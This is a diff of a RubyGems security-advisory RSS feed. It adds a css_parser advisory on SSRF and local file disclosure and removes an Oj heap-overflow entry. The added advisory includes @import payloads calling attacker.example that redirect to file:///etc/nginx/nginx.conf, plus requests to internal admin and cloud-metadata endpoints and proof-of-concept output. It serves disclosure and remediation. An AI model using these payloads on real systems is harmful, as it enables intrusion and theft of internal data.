@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/rubygems.rss</id>
     <title>Security Advisory for Ruby gems hosted at RubyGems.org</title>
-    <updated>2026-07-09T11:43:51.083Z</updated>
+    <updated>2026-07-09T14:28:06.552Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Arubygems"/>
     <subtitle>Security Advisory for Ruby gems hosted at RubyGems.org on GitHub</subtitle>
@@ -11,6 +11,295 @@
     <category term="HIGH"/>
     <category term="MODERATE"/>
     <category term="LOW"/>
+    <entry>
+        <title type="html"><![CDATA[[css_parser] Ruby CSS Parser: SSRF and Local File Disclosure in `CssParser::Parser#read_remote_file`]]></title>
+        <id>https://github.com/advisories/GHSA-9pmc-p236-855h</id>
+        <link href="https://github.com/advisories/GHSA-9pmc-p236-855h"/>
+        <updated>2026-07-09T13:43:14.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p><code>CssParser::Parser#read_remote_file</code> (and therefore <code>load_uri!</code>, and the <code>@import</code>-following branch of <code>add_block!</code>) issues HTTP/HTTPS requests against any host, port and URI it is handed, with no scheme allowlist, no host / IP filtering, and no protection against link-local, loopback or RFC‑1918 addresses. <code>Location:</code> redirects are followed recursively back into the same function, which <strong>also services <code>file://</code> URIs</strong>, so a single attacker-controlled HTTP redirect upgrades the bug from SSRF to arbitrary local file disclosure.</p>
+<p>In practice, any consumer of <code>css_parser</code> that hands it attacker‑influenced CSS together with a <code>base_uri:</code> option — Premailer being the canonical example — is exposed. The attacker only needs the ability to land one <code>@import url(...)</code> in the CSS that the host application parses.</p>
+<h2 id="vulnerable-code">Vulnerable code</h2>
+<p><a href="https://github.com/premailer/css_parser/blob/cee10f16b11dd175f17b0e5f6aefa488378e964b/lib/css_parser/parser.rb#L613-L687"><code>lib/css_parser/parser.rb#L613-L687</code></a>:</p>
+<pre><code class="language-ruby">def read_remote_file(uri) # :nodoc:
+  ...
+  begin
+    uri = Addressable::URI.parse(uri.to_s)
+
+    if uri.scheme == 'file'
+      # local file
+      path = uri.path
+      path.gsub!(%r{^/}, '') if Gem.win_platform?
+      src = File.read(path, mode: 'rb')        # &lt;-- arbitrary local read
+    else
+      # remote file
+      if uri.scheme == 'https'
+        uri.port = 443 unless uri.port
+        http = Net::HTTP.new(uri.host, uri.port)
+        http.use_ssl = true
+      else
+        http = Net::HTTP.new(uri.host, uri.port)  # &lt;-- arbitrary host:port
+      end
+
+      res = http.get(uri.request_uri, ...)
+      ...
+      elsif res.code.to_i &gt;= 300 and res.code.to_i &lt; 400
+        unless res['Location'].nil?
+          return read_remote_file Addressable::URI.parse(...)  # &lt;-- cross-scheme redirect
+        end
+      end
+    ...
+</code></pre>
+<p>There is <strong>no validation</strong> of <code>uri.host</code>, <code>uri.scheme</code>, or the resolved IP address — neither before the HTTP request, nor before the recursive call on the <code>Location</code> header.</p>
+<p>The user-facing entry points that reach this sink are:</p>
+<ul>
+<li><a href="https://github.com/premailer/css_parser/blob/cee10f16b11dd175f17b0e5f6aefa488378e964b/lib/css_parser/parser.rb#L489-L516"><code>Parser#load_uri!</code></a> — directly calls <code>read_remote_file</code> (line 513).</li>
+<li><a href="https://github.com/premailer/css_parser/blob/cee10f16b11dd175f17b0e5f6aefa488378e964b/lib/css_parser/parser.rb#L117-L162"><code>Parser#add_block!</code></a> — when invoked with <code>base_uri:</code> and the default <code>import: true</code>, scans the CSS for <code>@import url(...)</code> rules and resolves each one through <code>load_uri!</code> (line 150).</li>
+</ul>
+<h2 id="threat-model-and-scope">Threat model and scope</h2>
+<table>
+<thead>
+<tr>
+<th>Capability</th>
+<th>Reachable?</th>
+<th>Notes</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Arbitrary outbound <code>http://</code> / <code>https://</code> GET to any host:port reachable from the server</td>
+<td>✅</td>
+<td>No host, IP, port or scheme allowlist. Works against loopback, RFC‑1918, link‑local (169.254/16, AWS / GCP / Azure IMDS), and Docker / k8s service IPs.</td>
+</tr>
+<tr>
+<td>Recovering the response body</td>
+<td>✅ (conditional)</td>
+<td>The body is fed back into <code>add_block!</code>. Any bytes that form <code>selector { decl }</code> round‑trip out via <code>Parser#each_selector</code> / <code>to_s</code>. A consumer that emits the parsed CSS (e.g. Premailer inlining into HTML) leaks the body to the original attacker.</td>
+</tr>
+<tr>
+<td>Local file read via cross-scheme redirect (<code>Location: file://...</code>)</td>
+<td>⚠️ partial</td>
+<td>Redirect is followed without checking the new scheme; the recursive call services <code>file://</code> with <code>File.read</code>. The read itself executes against any path the Ruby process can open. <strong>Content recovery via the parser API is constrained by CSS grammar</strong> — see "File-disclosure scope" below.</td>
+</tr>
+<tr>
+<td>File-existence oracle</td>
+<td>✅</td>
+<td>With default <code>io_exceptions: true</code>, missing paths raise <code>CssParser::RemoteFileError</code> and existing paths return silently. An attacker can iterate <code>file://</code> targets to enumerate filesystem layout, usernames, installed software, etc.</td>
+</tr>
+<tr>
+<td>Side-effecting GETs against unprotected internal admin endpoints</td>
+<td>✅</td>
+<td>Even with a non‑CSS response, the request still fires. Internal services that act on GET (legacy admin panels, debug endpoints, cache busters, queue triggers) execute.</td>
+</tr>
+<tr>
+<td>Forced gzip / deflate decompression (DoS / decompression bomb)</td>
+<td>✅</td>
+<td><code>Accept-Encoding: gzip</code> is hardcoded (line 650) and the body is decompressed with <code>Zlib::GzipReader</code> / <code>Zlib::Inflate</code> (lines 665-672). An attacker server can return a small gzipped payload that decompresses to multiple GB.</td>
+</tr>
+<tr>
+<td>HTTPS internal targets with self-signed / private CA certs</td>
+<td>⚠️</td>
+<td><code>Net::HTTP#use_ssl = true</code> defaults to <code>VERIFY_PEER</code>, so internal HTTPS hosts with private certs will fail the SSL handshake. Plain HTTP, and HTTPS hosts whose certs chain to a CA trusted by the process, are fully exploitable.</td>
+</tr>
+<tr>
+<td>Smuggling other TCP protocols (Redis, Memcached, etc.) via the HTTP client</td>
+<td>⚠️</td>
+<td><code>Net::HTTP</code> writes a real HTTP request line, so Redis / Memcached won't accept it. The TCP connect itself does occur, which can still trigger logs, port-scan effects, and connection-state side effects in firewalled environments.</td>
+</tr>
+</tbody></table>
+<h3 id="file-disclosure-scope-cross-scheme-redirect-leg">File-disclosure scope (cross-scheme redirect leg)</h3>
+<p>The <code>file://</code> branch of <code>read_remote_file</code> does an unconditional <code>File.read</code>, but the contents are then handed back to <code>add_block!</code> and fed through the CSS tokenizer (<a href="https://github.com/premailer/css_parser/blob/cee10f16b11dd175f17b0e5f6aefa488378e964b/lib/css_parser/parser.rb#L342-L480"><code>parse_block_into_rule_sets!</code></a>). Only content that fits the grammar at the lexer level survives:</p>
+<ul>
+<li><strong>Selector slot</strong> — any text accumulated before the next <code>{</code> becomes the selector for that rule (including text spanning multiple lines).</li>
+<li><strong>Declarations slot</strong> — only <code>prop: value;</code> pairs inside <code>{ ... }</code> are retained. The <code>Declarations</code> parser splits on <code>;</code>, requires <code>:</code>, and drops anything else (<a href="https://github.com/premailer/css_parser/blob/cee10f16b11dd175f17b0e5f6aefa488378e964b/lib/css_parser/rule_set.rb#L655-L681">rule_set.rb#L655-L681</a>).</li>
+<li>A rule is only added when the <em>raw</em> declarations string between <code>{</code> and <code>}</code> is non-empty (<a href="https://github.com/premailer/css_parser/blob/cee10f16b11dd175f17b0e5f6aefa488378e964b/lib/css_parser/parser.rb#L396">parser.rb#L396</a>).</li>
+</ul>
+<p>Empirical results against vulnerable 2.2.0 with <code>Location: file://&lt;path&gt;</code>:</p>
+<table>
+<thead>
+<tr>
+<th>File contents</th>
+<th>Recoverable through <code>to_s</code> / <code>each_selector</code>?</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>root:x:0:0:root:/root:/bin/bash\napi_key=…</code> (no braces)</td>
+<td>nothing</td>
+</tr>
+<tr>
+<td><code>{"AccessKeyId":"AKIA…","Secret":"wJalr…"}</code> (JSON, leading <code>{</code>)</td>
+<td>nothing via <code>to_s</code>; partial leak via <code>each_rule_set</code> (empty selector + one parsed declaration)</td>
+</tr>
+<tr>
+<td><code>SECRET=eyJhbGc… {}</code> (empty braces)</td>
+<td>nothing (rule not added — raw decls empty)</td>
+</tr>
+<tr>
+<td><code>api_key=…\ndatabase{host:db.internal;pw:hunter2;}</code></td>
+<td>full leak: selector = <code>api_key=… database</code>, decls = <code>host: db.internal; pw: hunter2</code></td>
+</tr>
+<tr>
+<td>nginx / HCL-style config: <code>name { key: value; }</code></td>
+<td>full leak of both slots</td>
+</tr>
+</tbody></table>
+<p>In practice this means <strong>high-value targets that aren't CSS-shaped — TLS keys, SSH keys, JWTs, <code>.env</code> files (<code>KEY=VALUE</code> lines), <code>/etc/passwd</code>, binary content — do not leak their bytes through the parser API</strong>. Configuration files written in block-style DSLs (nginx, HCL/Terraform, Caddy, etc.) leak heavily. The <code>File.read</code> itself always executes, which is enough to (a) act as a file-existence oracle and (b) cause resource exhaustion on large pseudo-files like <code>/dev/zero</code>.</p>
+<p>The <strong>stronger</strong> recovery channel is the SSRF leg, not file disclosure: when the response comes from an internal HTTP service, Premailer-style consumers serialize the parsed CSS back into rendered HTML/email output, and any CSS-shaped bytes in the response surface there.</p>
+<h3 id="is-it-blind">Is it "blind"?</h3>
+<p>It is <em>not</em> a classic blind SSRF. The bug has two recovery channels:</p>
+<ol>
+<li><strong>Application output.</strong> The library is most commonly driven by Premailer, which writes the parsed CSS back into the rendered HTML. Any response bytes that happen to form CSS rules are emitted into the output document and therefore visible to whoever receives the rendered output. Internal endpoints frequently return content that parses as CSS by accident — anywhere <code>{ ... }</code> appears (JSON objects sit just inside that envelope; many config-dump endpoints look the same) the contents become exfiltratable rules.</li>
+<li><strong>Side effects on the destination.</strong> Because the request actually leaves the server, an attacker who controls the destination URL sees the request unconditionally (URL, headers, source IP, user-agent from <code>@options[:user_agent]</code>). And when the destination is an internal service the attacker does <em>not</em> control, the GET is nonetheless executed against that service.</li>
+</ol>
+<h2 id="reproduction">Reproduction</h2>
+<p>A minimal, self-contained reproducer is attached as <a href="./poc.rb"><code>poc.rb</code></a>. It spins up two local WEBrick servers (a fake "internal" service on 127.0.0.1:18080 and an attacker-controlled redirector on 127.0.0.1:18081) and runs four scenarios against <code>css_parser</code> 2.2.0.</p>
+<pre><code>$ gem install css_parser -v 2.2.0
+$ gem install webrick     # not bundled with Ruby &gt;= 3.0
+$ ruby poc.rb
+</code></pre>
+<h3 id="actual-output">Actual output</h3>
+<pre><code>========================================================================
+POC 1 — SSRF: force a GET to an internal-only HTTP endpoint and
+         recover the response body via the parser API
+========================================================================
+Attacker-supplied CSS:
+  @import url("http://127.0.0.1:18080/admin-credentials");
+Internal endpoint hit count: 1  (should be &gt;= 1)
+Rules parsed from the internal response:
+  .creds { content: "AKIAFAKEINTERNALONLY:wJalrXUtnFEMIFAKESECRET"; }
+
+========================================================================
+POC 2 — Cross-scheme redirect: HTTP 302 → file:// → local file read
+========================================================================
+Local secret file: /tmp/css_parser_nginx.conf
+Attacker-supplied CSS:
+  @import url("http://127.0.0.1:18081/to-local-file");
+Rules parsed from the redirect target (a local file):
+  server { listen: 443; server_name: internal.example.com;
+           ssl_certificate_key: /etc/nginx/ssl/SECRET_PRIVATE_KEY.pem;
+           proxy_pass: http://10.0.0.42:8080; }
+
+========================================================================
+POC 3 — Direct load_uri! also affected
+========================================================================
+parser.load_uri!('http://127.0.0.1:18080/admin-credentials')
+  .creds { content: "AKIAFAKEINTERNALONLY:wJalrXUtnFEMIFAKESECRET"; }
+
+========================================================================
+POC 4 — Pure SSRF side-effect (works even when the response is not CSS-shaped)
+========================================================================
+Attacker-supplied CSS:
+  @import url("http://127.0.0.1:18080/admin/delete-user?id=42");
+Internal side-effect endpoint reached? true
+Request observed by internal service: "/admin/delete-user?id=42"
+</code></pre>
+<h3 id="minimal-one-line-triggers">Minimal one-line triggers</h3>
+<p>The smallest possible attacker payload is a single <code>@import</code> rule. The following three examples are ordered from "highest practical impact" to "least", because the parser's data-recovery surface depends on the shape of the response (see the "File-disclosure scope" table above):</p>
+<p><strong>1. Internal block-DSL config via cross-scheme redirect → file://</strong> — nginx, HCL/Terraform, Caddy, BIND, etc. all use <code>name { key value; }</code> block syntax, which round-trips cleanly out of the css_parser API. An attacker who controls <code>attacker.example</code> redirects to the local file:</p>
+<pre><code class="language-css">/* attacker.css */
+@import url("https://attacker.example/r");
+</code></pre>
+<pre><code>GET https://attacker.example/r
+→ 302 Location: file:///etc/nginx/nginx.conf
+</code></pre>
+<p>Result: the full <code>server { listen 443 ssl; ssl_certificate_key …; … }</code> block is parsed into selectors and declarations and surfaces via <code>parser.to_s</code>, which Premailer-style consumers re-emit into rendered output.</p>
+<p><strong>2. Side-effecting internal admin GET</strong> — even when the response is not CSS-shaped, the request still executes against the internal service:</p>
+<pre><code class="language-css">@import url("http://internal-admin.local/api/v1/users/42?action=delete");
+</code></pre>
+<p>No data exfiltration is required for this to be a vulnerability: the attacker has achieved an authenticated-from-localhost GET against an internal control-plane endpoint.</p>
+<p><strong>3. Internal HTTP service whose body happens to be CSS-shaped</strong> — a status / debug page or a config endpoint that emits <code>block { key: value; }</code> text. Same recovery profile as case (1).</p>
+<pre><code class="language-css">@import url("http://internal-svc.local/debug/config");
+</code></pre>
+<p>All three payloads are parsed via:</p>
+<pre><code class="language-ruby">require 'css_parser'
+parser = CssParser::Parser.new
+parser.add_block!(File.read('attacker.css'), base_uri: 'http://attacker.example/')
+</code></pre>
+<p><code>base_uri:</code> is the only required option — it is what enables the <code>@import</code>-following code path (<a href="https://github.com/premailer/css_parser/blob/cee10f16b11dd175f17b0e5f6aefa488378e964b/lib/css_parser/parser.rb#L147-L150">parser.rb:147-150</a>). Premailer always sets <code>base_uri:</code> when given an HTML document that has a URL, so every Premailer pipeline that processes attacker-influenced HTML/CSS reaches this sink.</p>
+<blockquote>
+<p>Note on the EC2 IMDS / <code>169.254.169.254</code> example often associated with SSRF write-ups: <code>@import url("http://169.254.169.254/latest/meta-data/iam/security-credentials/")</code> <strong>does fire the request</strong>, but the role-list response is plain text with no <code>{</code> characters and is therefore discarded by the CSS tokenizer — nothing surfaces via <code>parser.to_s</code> or <code>each_selector</code>. The per-role credentials JSON endpoint <em>partially</em> leaks the body as a single declaration value, but only via <code>each_rule_set</code> / <code>each_declaration</code>, which Premailer does not expose to its output. IMDSv2 is not exploitable at all (no <code>PUT</code> support, no header injection). The bug is still serious — just not via the IMDS path the way an XHR/curl-based SSRF would be.</p>
+</blockquote>
+<h3 id="standalone-file-via-load_uri-no-http-redirect-needed">Standalone <code>file://</code> via <code>load_uri!</code> (no HTTP redirect needed)</h3>
+<p>Independent of the SSRF / redirect chain above, <code>Parser#load_uri!</code> itself executes <code>File.read</code> against any <code>file://</code> URI it is handed, and <code>Parser#add_block!(css, base_uri: 'file:///some/dir/')</code> resolves <code>@import</code> against that base. Any application that hands an attacker-influenced URI (or an <code>@import</code> URL with an attacker-influenced base) to either method has a local file read primitive — no HTTP, no redirect, no <code>ssrf_filter</code>-bypass technique required.</p>
+<pre><code class="language-ruby">require 'css_parser'
+parser = CssParser::Parser.new
+parser.load_uri!('file:///etc/nginx/nginx.conf')  # direct File.read
+</code></pre>
+<p>…or via a CSS-driven path with an attacker-controlled <code>@import</code>:</p>
+<pre><code class="language-ruby">parser = CssParser::Parser.new
+parser.add_block!(File.read('attacker.css'), base_uri: 'file:///etc/')
+# attacker.css contains: @import url("nginx/nginx.conf");
+</code></pre>
+<p>The recoverable-content rules in the "File-disclosure scope" subsection above apply identically here — the bytes flow through the same <code>add_block!</code> tokenizer regardless of whether they arrived via redirect or directly. Applications that don't accept HTTP URLs from users but <em>do</em> construct <code>file://</code> URIs from any user-supplied component are exposed.</p>
+<p>This is a separate weakness (<code>CWE-73</code>) from the SSRF leg (<code>CWE-918</code>) and is gated by its own opt-in flag in 3.0.0 (see "Fix as shipped in 3.0.0" below).</p>
+<h2 id="suggested-remediation">Suggested remediation</h2>
+<ol>
+<li><strong>Reject non-<code>http(s)</code> schemes in <code>read_remote_file</code>.</strong> Before the recursive redirect call at line 661 and at the top of <code>read_remote_file</code>, require <code>uri.scheme.in?(%w[http https])</code>. The <code>file://</code> branch at lines 635-639 should be removed from <code>read_remote_file</code> entirely — local files are already handled by <code>load_file!</code>, so keeping a <code>file://</code> branch in the <em>remote</em> read path serves no purpose other than enabling this redirect bypass.</li>
+<li><strong>Validate the resolved address against private / link-local / loopback ranges</strong>, behind an opt-in option (e.g. <code>allow_local_uris: false</code>). At minimum, resolve <code>uri.host</code> and reject results in <code>127.0.0.0/8</code>, <code>10/8</code>, <code>172.16/12</code>, <code>192.168/16</code>, <code>169.254/16</code>, <code>::1</code>, <code>fc00::/7</code>, <code>fe80::/10</code>, and unspecified addresses. The check must be done <em>after</em> DNS resolution and re-checked on every redirect hop, otherwise DNS rebinding and CNAME redirection trivially bypass it.</li>
+<li><strong>Re-validate every redirect hop.</strong> The recursive call at line 661 currently inherits no validation. Apply the same scheme / host / address checks as step 1-2 before recursing.</li>
+<li><strong>Bound the response size</strong> read from <code>http.get</code> and decompressed at lines 665-672, to mitigate decompression bombs.</li>
+<li><strong>Document the security posture.</strong> <code>load_uri!</code> / <code>add_block!</code> with <code>base_uri:</code> should be documented as security-sensitive, with a clear recommendation that any caller exposing them to untrusted CSS use the allowlist option above.</li>
+</ol>
+<p>Many of these issues could be generally remediated by replacing the network logic with the <a href="https://github.com/arkadiyt/ssrf_filter">ssrf_filter</a> gem.</p>
+<h2 id="fix-as-shipped-in-300">Fix as shipped in 3.0.0</h2>
+<p>The remediation lands as two structural changes plus two new independent opt-in flags. The structural changes apply unconditionally; the flags let callers re-enable specific subsets of the old behaviour where they have a legitimate need.</p>
+<h3 id="structural-changes-always-on-no-opt-out">Structural changes (always on, no opt-out)</h3>
+<ul>
+<li><strong>Outbound HTTP goes through <a href="https://github.com/arkadiyt/ssrf_filter"><code>ssrf_filter</code></a> by default.</strong> <code>ssrf_filter</code> resolves the hostname with <code>Resolv</code>, rejects unsafe IP ranges (loopback, RFC-1918, link-local, multicast, IPv6 ULAs, cloud metadata), enforces a <code>scheme_whitelist</code> of <code>%w[http https]</code>, and re-validates scheme and IP on every redirect hop. CNAME-to-private-IP and other DNS-rebinding-style bypasses are defeated by the resolved-IP check.</li>
+<li><strong><code>file://</code> is no longer reachable from the remote-fetch path at all.</strong> The <code>file://</code> handling was moved out of <code>read_remote_file</code> entirely into <code>load_uri!</code>, so a 3xx <code>Location: file://...</code> response cannot be followed regardless of how the parser is configured.</li>
+<li><strong><code>Accept-Encoding: gzip</code> is no longer requested</strong> by the remote-fetch path, removing the decompression-bomb surface that was called out as a separate mitigation item.</li>
+</ul>
+<h3 id="new-parser-options">New <code>Parser</code> options</h3>
+<p>Two independent off-by-default flags, mapping 1:1 to the two CWE classes:</p>
+<table>
+<thead>
+<tr>
+<th>Option</th>
+<th>Default</th>
+<th>Gates</th>
+<th>Threat class</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>allow_local_network</code></td>
+<td><code>false</code></td>
+<td>http(s) requests resolving to loopback / RFC-1918 / link-local / IMDS addresses</td>
+<td>CWE-918 (SSRF)</td>
+</tr>
+<tr>
+<td><code>allow_file_uris</code></td>
+<td><code>false</code></td>
+<td><code>file://</code> URIs via <code>load_uri!</code> (and <code>@import</code> resolved against <code>file://</code> base_uri)</td>
+<td>CWE-73 (LFI)</td>
+</tr>
+</tbody></table>
+<p>Each flag is <strong>independent</strong>: setting <code>allow_local_network: true</code> does <strong>not</strong> permit <code>file://</code>, and <code>allow_file_uris: true</code> does <strong>not</strong> permit loopback HTTP. Callers grant exactly the threat surface they need open and nothing more.</p>
+<p><code>load_file!</code> — the explicit local-file API that takes a path (not a URI) — is unaffected by either flag, because the path comes from the caller's own code, not from a user-influenced URI.</p>
+<h3 id="upgrade-notes">Upgrade notes</h3>
+<ul>
+<li><strong>Premailer / email-rendering / link-preview pipelines</strong>: no code changes required. The default-secure 3.0.0 configuration is exactly what you want — the same <code>Parser.new</code> instantiation now refuses SSRF and LFI attempts.</li>
+<li><strong>Test suites that fetch from <code>localhost</code> or a loopback fixture server</strong>: pass <code>allow_local_network: true</code> on the relevant <code>Parser.new</code> calls.</li>
+<li><strong>Code that deliberately calls <code>parser.load_uri!('file://...')</code> or sets <code>base_uri: 'file://...'</code></strong>: pass <code>allow_file_uris: true</code>. Where possible, prefer migrating to <code>parser.load_file!(path)</code> instead — it's the explicit local-file API and is not subject to the URI gate.</li>
+<li><strong>Code that uses both</strong> (e.g. integration tests against a local HTTP fixture <em>and</em> file:// fixtures): pass both, <code>Parser.new(allow_local_network: true, allow_file_uris: true)</code>.</li>
+</ul>
+<p>The fix landed across these commits: <code>ba74c3c</code> (failing tests), <code>7d2ddf0</code> (implementation), <code>e0a1514</code> (defensive invariant guards), all merged.</p>
+<h2 id="credit">Credit</h2>
+<p>This vulnerability was reported by @JLLeitschuh of the @braze-inc security team. This vulnerability was originally discovered by the pentesters at @nccgroup.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/premailer/css_parser/security/advisories/GHSA-9pmc-p236-855h">https://github.com/premailer/css_parser/security/advisories/GHSA-9pmc-p236-855h</a></li>
+<li><a href="https://github.com/rubysec/ruby-advisory-db/blob/master/gems/css_parser/CVE-2026-53727.yml">https://github.com/rubysec/ruby-advisory-db/blob/master/gems/css_parser/CVE-2026-53727.yml</a></li>
+<li><a href="https://www.cve.org/CVERecord/SearchResults?query=CVE-2026-53727">https://www.cve.org/CVERecord/SearchResults?query=CVE-2026-53727</a></li>
+<li><a href="https://github.com/advisories/GHSA-9pmc-p236-855h">https://github.com/advisories/GHSA-9pmc-p236-855h</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-9pmc-p236-855h</uri>
+        </author>
+        <category label="severity" term="HIGH"/>
+        <published>2026-07-09T13:43:13.000Z</published>
+    </entry>
     <entry>
         <title type="html"><![CDATA[[pay] pay-rails/pay: non-constant-time HMAC comparison in Paddle Billing webhook signature verifier]]></title>
         <id>https://github.com/advisories/GHSA-mjgf-xj26-9qf9</id>
@@ -1289,59 +1578,5 @@ Oj::Doc.open('[1,[2]]') { |doc| doc.each_leaf { |d| d.close } }
         </author>
         <category label="severity" term="HIGH"/>
         <published>2026-06-19T19:36:50.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[oj] Oj: Heap Buffer Overflow in Oj.dump Exception Serialization via Large Indent]]></title>
-        <id>https://github.com/advisories/GHSA-35w3-pjm6-wj95</id>
-        <link href="https://github.com/advisories/GHSA-35w3-pjm6-wj95"/>
-        <updated>2026-06-19T19:36:47.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
-<p><code>Oj.dump</code> in object mode is vulnerable to a heap buffer overflow when serializing Exception objects with a large <code>:indent</code> value. The serializer allocates a buffer sized for the object's attributes but does not account for the indent bytes added on each write. With <code>indent: 5000</code>, the accumulation of 5,000-byte indent strings overflows the 13,150-byte heap allocation, corrupting adjacent heap memory.</p>
-<h3 id="version">Version</h3>
-<ul>
-<li><strong>Software</strong>: oj gem</li>
-<li><strong>Affected</strong>: all versions with <code>ext/oj/dump.h</code></li>
-<li><strong>Latest tested</strong>: 3.17.1 (confirmed present)</li>
-</ul>
-<h3 id="details">Details</h3>
-<p><code>ext/oj/dump.h</code>, line 75–77:</p>
-<pre><code class="language-c">static void fill_indent(Out out, int depth) {
-    if (0 &lt; out-&gt;opts-&gt;indent) {
-        memset(out-&gt;buf + out-&gt;cur, ' ', (size_t)(out-&gt;opts-&gt;indent * depth));
-</code></pre>
-<p>When dumping an Exception object in <code>:object</code> mode, <code>dump_obj_attrs</code> calls <code>fill_indent</code> repeatedly for each attribute. The buffer is pre-allocated based on the serialized content but not the indentation overhead. With <code>indent: 5000</code> the indent block for a nested object exceeds the remaining buffer space, producing a heap-buffer-overflow of size 5,000 at the end of the allocated region.</p>
-<p>ASAN report:</p>
-<pre><code>==101656==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x527000022c5e
-WRITE of size 5000 at 0x527000022c5e thread T0
-    #0 memset
-    #1 fill_indent       /ext/oj/dump.h:77
-    #2 dump_obj_attrs    /ext/oj/dump_object.c:552
-    #3 dump_obj          /ext/oj/dump_object.c:80
-    #4 oj_dump_obj_val   /ext/oj/dump_object.c:708
-    #5 oj_dump_obj_to_json_using_params  /ext/oj/dump.c:817
-    #6 dump_body         /ext/oj/oj.c:1429
-    #7 dump              /ext/oj/oj.c:1480
-0x527000022c5e is located 0 bytes after 13150-byte region [0x52700001f900, 0x527000022c5e)
-</code></pre>
-<h3 id="reproduce">Reproduce</h3>
-<pre><code class="language-ruby">require "oj"
-obj = Oj.load('{"^o":"RuntimeError"}', mode: :object)
-Oj.dump(obj, mode: :object, indent: 5000)
-</code></pre>
-<h3 id="workarounds">Workarounds</h3>
-<p>This is at the discretion of the developer and not a public facing option so the workaround is the develop should not use extreme indents and should not offer the option for users to dump Ruby data with unlimited indentation size.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/ohler55/oj/security/advisories/GHSA-35w3-pjm6-wj95">https://github.com/ohler55/oj/security/advisories/GHSA-35w3-pjm6-wj95</a></li>
-<li><a href="https://github.com/advisories/GHSA-35w3-pjm6-wj95">https://github.com/advisories/GHSA-35w3-pjm6-wj95</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-35w3-pjm6-wj95</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-06-19T19:36:47.000Z</published>
     </entry>
 </feed>
